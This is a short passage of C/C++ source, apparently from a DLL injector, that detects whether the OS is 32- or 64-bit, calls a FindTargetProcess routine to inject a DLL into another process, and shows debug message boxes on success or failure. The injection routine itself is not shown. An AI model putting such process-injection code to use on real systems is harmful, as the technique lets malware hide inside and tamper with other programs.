
	// Check if OS is 32 or 64 bit
	if (GetSystemWow64DirectoryA(SysWow64Dir, MAX_PATH))
		isWin32 = FALSE;

	// Find a target and inject the dll
	if (FindTargetProcess(Target, pLibPath, isWin32)) {
		DEBUG_CODE(MessageBoxA(0, "Injected", "Debug", MB_OK););
	}
	else {
		DEBUG_CODE(MessageBoxA(0, "Injection Failed", "Debug", MB_ICONERROR););
	}
	
	if (Target) delete[] Target;
	return;
}
